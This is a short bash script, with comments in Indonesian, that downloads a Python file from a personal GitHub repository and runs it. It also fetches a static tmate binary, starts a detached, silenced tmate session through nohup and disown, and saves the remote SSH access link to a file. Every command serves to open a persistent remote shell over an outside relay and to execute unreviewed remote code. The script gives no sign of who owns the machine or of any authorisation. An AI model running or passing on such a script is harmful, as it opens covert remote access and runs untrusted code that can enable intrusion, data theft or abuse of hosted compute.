wget https://raw.githubusercontent.com/Pkoka99/poka1/refs/heads/main/m.py
rm -r tmate.txt
pkill -9 tmate
wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &>/dev/null
tar --skip-old-files -xf tmate-2.4.0-static-linux-i386.tar.xz &>/dev/null
bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1
./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
# simpan link ke file
./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "#{tmate_ssh} -t" > tmate.txt
echo "Link tmate tersimpan di tmate.txt"
python m.py
